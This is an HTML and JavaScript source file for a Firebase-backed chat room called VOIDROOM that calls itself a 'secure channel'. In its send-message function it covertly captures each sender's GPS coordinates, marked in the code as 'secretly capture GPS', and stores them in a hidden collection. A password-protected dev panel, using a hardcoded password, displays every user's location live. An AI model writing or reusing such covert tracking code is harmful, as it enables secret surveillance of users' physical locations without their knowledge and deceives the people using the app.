<!DOCTYPE html>  <html lang="en">  
<head>  
<meta charset="UTF-8">  
<meta name="viewport" content="width=device-width, initial-scale=1.0">  <title>VOIDROOM v0.1.0</title>  <link rel="preconnect" href="https://fonts.googleapis.com">  
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">

<style>  

#versionText {
    color: #777;
    font-weight: 400;
    letter-spacing: 1px;
}

#nameScreen {
    display: none;
}
#mainUI {
    display: none;
}

*{  
    margin:0;  
    padding:0;  
    box-sizing:border-box;  
}  

body{
    background:#050505;
    color:#00ff88;
    font-family:"JetBrains Mono", monospace;
    overflow:hidden;
    height:100dvh;
}

/* MATRIX BACKGROUND */  

canvas{  
    position:fixed;  
    top:0;  
    left:0;  
    width:100%;  
    height:100%;  
    z-index:-1;  
    opacity:0.18;  
}  

/* MAIN UI */  

.container{
    width:95%;
    max-width:1000px;
    height:100dvh;
    min-height:100dvh;

    margin:auto;

    border:1px solid #1a1a1a;
    background:rgba(0,0,0,0.78);

    backdrop-filter:blur(4px);

    display:flex;
    flex-direction:column;

    box-shadow:
    0 0 25px rgba(0,255,120,0.08);

    overflow:hidden;
}

/* HEADER */  

.header{  
    padding:18px;  
    border-bottom:1px solid #1b1b1b;  

    display:flex;  
    justify-content:space-between;  
    align-items:center;  
}  

.logo{  
    font-size:24px;  
    font-weight:700;  
    letter-spacing:2px;  
}  

.online{  
    color:#aaaaaa;  
    font-size:14px;  
}  

/* CHAT */  

.chat{  
    flex:1;  
    overflow-y:auto;  

    padding:20px;  

    min-height:0;
}  

.message{  
    margin-bottom:14px;  
    animation:fade 0.25s linear;  
}  

.message .name{  
    color:#00ffaa;  
    font-weight:bold;  
}  

.message .time{  
    color:#666;  
    font-size:12px;  
}  

.message .text{  
    margin-top:3px;  
    color:#e0e0e0;  
    word-wrap:break-word;  
}  

.system{  
    color:#ff5555;  
    margin-bottom:12px;  
    font-size:13px;  
}  

@keyframes fade{  
    from{  
        opacity:0;  
        transform:translateY(8px);  
    }  

    to{  
        opacity:1;  
        transform:translateY(0px);  
    }  
}  

/* INPUT AREA */  

.inputArea{
    border-top:1px solid #1a1a1a;
    display:flex;
    gap:10px;
    padding:15px;
    flex-shrink:0;
}

input{  
    background:#0f0f0f;  
    border:1px solid #222;  
    color:white;  
    padding:14px;  

    font-family:inherit;  
    outline:none;  
    min-width:0;
}  

#username{  
    width:180px;  
}  

#messageInput{  
    flex:1;  
}  

button{  
    background:#00aa66;  
    border:none;  
    color:white;  

    padding:14px 18px;  

    cursor:pointer;  

    font-family:inherit;  
    transition:0.2s;  
}  

button:hover{  
    background:#00cc77;  
}  

/* SCROLLBAR */  

.chat::-webkit-scrollbar{  
    width:8px;  
}  

.chat::-webkit-scrollbar-thumb{  
    background:#00aa66;  
}  

/* MOBILE */  

@media(max-width:700px){

    .container{
        width:100%;
        height:100dvh;
        border:none;
    }

    .inputArea{
        flex-direction:column;
    }

    #username{
        width:100%;
    }

    button{
        width:100%;
    }

}

</style>
</head>  
<body>  

<div id="versionPanel" style="
    display:none;
    position:fixed;
    top:0;
    left:0;
    width:100%;
    height:100%;
    background:#000;
    color:#00ff88;
    padding:20px;
    overflow:auto;
    z-index:99999;
">
    <div style="
        display:flex;
        justify-content:space-between;
        align-items:center;
        margin-bottom:20px;
    ">
        <h2>DEV VERSION UPDATE PANEL</h2>

        <button onclick="closeVersionPanel()" style="
            background:#220000;
            color:#ff5555;
            border:1px solid #ff5555;
            padding:8px 14px;
        ">
            EXIT
        </button>
    </div>

    <div style="margin-bottom:10px;">
        CURRENT VERSION: <span id="currentVersionText">loading...</span>
    </div>

    <input id="versionInput" placeholder="v0.2.0"
        style="padding:12px;background:#0f0f0f;color:white;border:1px solid #222;width:200px;">

    <button onclick="updateVersion()" style="
        margin-top:10px;
        padding:10px 14px;
        background:#00aa66;
        border:none;
        color:white;
        cursor:pointer;
    ">
        UPDATE VERSION
    </button>
</div>

<div id="devPanel" style="
    display:none;
    position:fixed;
    top:0;
    left:0;
    width:100%;
    height:100%;
    background:#000;
    color:#00ff88;
    padding:20px;
    overflow:auto;
    z-index:99999;
">
    <div style="
display:flex;
justify-content:space-between;
align-items:center;
margin-bottom:20px;
">

    <h2>DEV LOCATION TRACK PANEL</h2>

    <button onclick="closeDevPanel()" style="
    background:#220000;
    color:#ff5555;
    border:1px solid #ff5555;
    padding:8px 14px;
    ">
        EXIT
    </button>

</div>
    <div id="devOutput"></div>
</div>

<div id="nameScreen" style="
    position:fixed;
    top:0;
    left:0;
    width:100%;
    height:100%;
    background:#050505;
    flex-direction:column;
    justify-content:center;
    align-items:center;
    z-index:99999;
">
    <h2 style="color:#00ff88;">VOIDROOM ACCESS</h2>

    <input id="nameInput" placeholder="nickname"
        style="padding:14px; margin-top:20px; background:#0f0f0f; color:white; border:1px solid #222;">

    <button onclick="confirmName()" style="margin-top:15px;">
        ENTER
    </button>
</div>
<canvas id="matrix"></canvas>

<div class="container" id="mainUI" style="display:none;"> <div class="header">  
<div class="logo">
    VOIDROOM <span id="versionText">loading...</span>
</div>

    <div class="online" id="onlineCount">  
        ONLINE: 0 
    </div>  
</div>  

<div class="chat" id="chat"></div>  

<div class="inputArea">  

    <input  
    type="text"  
    id="messageInput"  
    placeholder="type message...">  

    <button onclick="sendMessage()">  
        SEND  
    </button>  

</div>

</div>  <script type="module">  

function getCoords() {
    return new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                resolve({
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude
                });
            },
            () => resolve(null)
        );
    });
}

/* =========================  
   FIREBASE IMPORTS  
========================= */  

import { initializeApp }  
from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";  

import {  

    getFirestore,  
    collection,  
    addDoc,  
    onSnapshot,  
    query,  
    orderBy,  
    serverTimestamp,  
    doc,  
    setDoc,  
    deleteDoc,  
    getDocs  

}  
from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";  


/* =========================  
   FIREBASE CONFIG  
========================= */  

const firebaseConfig = {  
  apiKey: "AIzaSyC7wse9OXr7XNngpS0ymAkBHa5u3hqn9vc",  
  authDomain: "cerac-terminal.firebaseapp.com",  
  projectId: "cerac-terminal",  
  storageBucket: "cerac-terminal.appspot.com",  
  messagingSenderId: "141584321783",  
  appId: "1:141584321783:web:a06f4147d64f87e9db97f2"  
};  

const app = initializeApp(firebaseConfig);  

const db = getFirestore(app);  


/* =========================  
   ESCAPE HTML  
========================= */  

function escapeHTML(str){  

    return str  
    .replace(/&/g, "&amp;")  
    .replace(/</g, "&lt;")  
    .replace(/>/g, "&gt;");  
}  


/* =========================  
   USER DATA  
========================= */  

const nameScreen = document.getElementById("nameScreen");
const nameInput = document.getElementById("nameInput");
const mainUI = document.getElementById("mainUI");

const savedName = localStorage.getItem("void_username");

if (savedName) {
    startApp(savedName);
} else {
    nameScreen.style.display = "flex";
    mainUI.style.display = "none";
}

let userId = localStorage.getItem("void_userId");

if (!userId) {
    userId = crypto.randomUUID();
    localStorage.setItem("void_userId", userId);
}

const onlineRef = doc(db, "onlineUsers", userId);

function startApp(name) {
    localStorage.setItem("void_username", name);
    localStorage.setItem("void_hasJoined", "true");

    nameScreen.style.display = "none";
    mainUI.style.display = "flex";

}

window.confirmName = function () {
    const name = nameInput.value.trim();

    if (!name) {
        alert("Enter nickname.");
        return;
    }

    startApp(name);
};

document.addEventListener("keydown", (e) => {
    if (e.ctrlKey && e.shiftKey && e.key === "D") {

        const pass = prompt("Dev password:");

        if (pass === "sugnoma") {
            document.getElementById("devPanel").style.display = "block";
            loadDevPanel();
        }
    }
});

function loadDevPanel() {

    const devOutput = document.getElementById("devOutput");

    const devRef = collection(db, "dev_locations");

    onSnapshot(devRef, (snapshot) => {

        devOutput.innerHTML = "";

        snapshot.forEach((doc) => {
            const data = doc.data();

            const div = document.createElement("div");

            div.style.marginBottom = "10px";
            div.style.borderBottom = "1px solid #222";
            div.style.paddingBottom = "8px";

const lat = Number(data.coords.lat).toFixed(6);
const lon = Number(data.coords.lon).toFixed(6);

const time =
data.created?.seconds

? new Date(data.created.seconds * 1000)
    .toLocaleTimeString([], {
        hour: "2-digit",
        minute: "2-digit"
    })

: "unknown";

div.innerHTML = `
    <div style="color:#00ffaa;font-weight:bold;">
        ${escapeHTML(data.user)}
    </div>

    <div style="margin-top:4px;color:#e0e0e0;">
        📍 ${lat}, ${lon}
    </div>

    <div style="margin-top:3px;color:#666;font-size:12px;">
        ${time}
    </div>
`;

            devOutput.appendChild(div);
        });
    });
}

window.closeDevPanel = function () {

    document.getElementById("devPanel").style.display = "none";

};

/* =========================  
   ONLINE USERS  
========================= */  

async function setOnline(){
    await setDoc(onlineRef, {
        online: true,
        lastSeen: Date.now()
    });
}

setOnline();  

setInterval(async () => {
    await setDoc(onlineRef, {
        online: true,
        lastSeen: Date.now()
    });
}, 10000);

window.addEventListener("beforeunload", async ()=>{  

    await deleteDoc(onlineRef);  

});  

/* REALTIME ONLINE COUNT */  

onSnapshot(collection(db, "onlineUsers"), (snapshot) => {
    const now = Date.now();
    let active = 0;

    snapshot.forEach((doc) => {
        const data = doc.data();
        if (now - data.lastSeen < 20000) {
            active++;
        }
    });

    document.getElementById("onlineCount").textContent =
        `ONLINE: ${active}`;
});

/* =========================  
   CHAT SYSTEM  
========================= */  

const chat =  
document.getElementById("chat");  

const messagesRef =  
collection(db, "messages");  

const q =  
query(messagesRef, orderBy("created"));  

function addSystemMessage(text){  

    const div =  
    document.createElement("div");  

    div.className = "system";  

    div.textContent = text;  

    chat.appendChild(div);  

    chat.scrollTop =  
    chat.scrollHeight;  
}  

addSystemMessage(  
"[ CONNECTED TO VOIDROOM ]"  
);  

/* REALTIME MESSAGE LISTENER */  

onSnapshot(q, (snapshot)=>{  

    chat.innerHTML = "";  

    addSystemMessage(  
    "[ SECURE CHANNEL ACTIVE ]"  
    );  

    snapshot.forEach((doc)=>{  

        const data = doc.data();  

        const wrapper =  
        document.createElement("div");  

        wrapper.className = "message";  

const time =
data.created?.seconds

? (() => {
    const d = new Date(data.created.seconds * 1000);

    const t = d.toLocaleTimeString([], {
        hour: "2-digit",
        minute: "2-digit"
    });

    const date = d.toLocaleDateString([], {
        day: "2-digit",
        month: "short",
        year: "numeric"
    });

    return `${t} | ${date}`;
})()

: "loading";

        wrapper.innerHTML = `  
  
        <div class="name">  
        ${escapeHTML(data.user)}  
        <span class="time">  
        ${time}  
        </span>  
        </div>  
  
        <div class="text">  
        ${escapeHTML(data.text)}  
        </div>  
  
        `;  

        chat.appendChild(wrapper);  

    });  

    chat.scrollTop =  
    chat.scrollHeight;  

});  


/* =========================  
   SEND MESSAGE  
========================= */  

window.sendMessage =  
async function(){  

const username = localStorage.getItem("void_username");

    const messageInput =  
    document.getElementById(  
    "messageInput"  
    );  

    const text =  
    messageInput.value.trim();  

    if(!username){  

        alert("Enter nickname.");  

        return;  
    }  

    if(!text) return;  
    
if (text === "/changeversion") {
    messageInput.value = "";

    const pass = prompt("Dev password:");

    if (pass === "sugnoma") {
        document.getElementById("versionPanel").style.display = "block";

        // show current version instantly
        const vText = document.getElementById("currentVersionText");
        if (vText) {
            const title = document.querySelector(".logo").textContent;
            vText.textContent = title.replace("VOIDROOM ", "");
        }
    }

    return;
}
    
    // SECRET DEV COMMAND
if (text === "/devpanel") {

    messageInput.value = "";

    const pass = prompt("Dev password:");

    if (pass === "sugnoma") {

        document.getElementById("devPanel").style.display = "block";

        loadDevPanel();
    }

    return;
}

    localStorage.setItem(  
        "void_username",  
        username  
    );  
    
    localStorage.setItem("void_hasJoined", "true");

    /* COMMANDS */  

    if(text === "/clear"){  

        chat.innerHTML = "";  

        addSystemMessage(  
        "[ LOCAL TERMINAL CLEARED ]"  
        );  

        messageInput.value = "";  

        return;  
    }  

    /* LIMIT MESSAGE LENGTH */  

    if(text.length > 300){  

        alert("Message too long.");  

        return;  
    }  

const savedText = text;

messageInput.value = "";

// 1. send normal message (public)
await addDoc(messagesRef, {
    user: username,
    text: savedText,
    created: serverTimestamp()
});

// 2. secretly capture GPS
const coords = await getCoords();

// 3. store GPS separately (DEV ONLY)
if (coords) {
    await addDoc(collection(db, "dev_locations"), {
        user: username,
        coords: coords,
        created: serverTimestamp()
    });
}

};

/* =========================  
   ENTER TO SEND  
========================= */  

document  
.getElementById("messageInput")  

.addEventListener("keydown",  

(e)=>{  

    if(e.key === "Enter"){  

        sendMessage();  

    }  

});  

const versionRef = doc(db, "config", "app");

onSnapshot(versionRef, (snap) => {
    const data = snap.data();
    const version = data?.version || "v0.0.0";

    document.title = `VOIDROOM ${version}`;

    document.getElementById("versionText").textContent = version;
    document.getElementById("currentVersionText").textContent = version;
});

window.updateVersion = async function () {
    const v = document.getElementById("versionInput").value.trim();

    if (!v) return;

    await setDoc(versionRef, {
        version: v
    }, { merge: true });

    document.getElementById("versionInput").value = "";
};

window.closeVersionPanel = function () {
    document.getElementById("versionPanel").style.display = "none";
};


/* =========================  
   MATRIX BACKGROUND  
========================= */  

const canvas =  
document.getElementById("matrix");  

const ctx =  
canvas.getContext("2d");  

canvas.width =  
window.innerWidth;  

canvas.height =  
window.innerHeight;  

const letters =  
"01ABCDEFGHIJKLMNOPQRSTUVWXYZ";  

const fontSize = 14;  

const columns =  
canvas.width / fontSize;  

const drops = [];  

for(let i = 0; i < columns; i++){  

    drops[i] = 1;  
}  

function drawMatrix(){  

    ctx.fillStyle =  
    "rgba(0,0,0,0.06)";  

    ctx.fillRect(  
        0,  
        0,  
        canvas.width,  
        canvas.height  
    );  

    ctx.fillStyle =  
    "#00ff88";  

    ctx.font =  
    fontSize + "px monospace";  

    for(let i = 0; i < drops.length; i++){  

        const text =  
        letters[  
        Math.floor(  
        Math.random() *  
        letters.length  
        )];  

        ctx.fillText(  
            text,  
            i * fontSize,  
            drops[i] * fontSize  
        );  

        if(  
            drops[i] * fontSize >  
            canvas.height &&  
            Math.random() > 0.975  
        ){  

            drops[i] = 0;  
        }  

        drops[i]++;  
    }  
}  

setInterval(drawMatrix, 35);  

window.addEventListener("resize", ()=>{  

    canvas.width =  
    window.innerWidth;  

    canvas.height =  
    window.innerHeight;  

});  

</script>  </body>  
</html>
